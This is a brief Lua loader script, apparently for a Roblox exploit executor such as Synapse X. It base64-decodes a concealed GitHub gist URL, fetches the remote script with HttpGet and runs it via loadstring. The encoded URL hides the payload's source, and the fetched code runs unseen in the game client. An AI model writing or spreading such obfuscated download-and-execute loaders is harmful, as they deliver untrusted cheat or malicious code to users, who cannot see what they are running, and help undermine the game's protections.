local str = "aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vR2hvc3REdWNreXkvZmJjNjM4NmY1ODI3YjllZGZjMDUxM2Y1ZTUwNWQ1ZWUvcmF3"
function decode(strs)
    local code = tostring(strs)
    if  syn and syn.crypt.base64.decode then
        return syn.crypt.base64.decode(code)
    else
        return base64_decode(code)
    end
end
local url = decode(str)
loadstring(game:HttpGet(tostring(url),true))()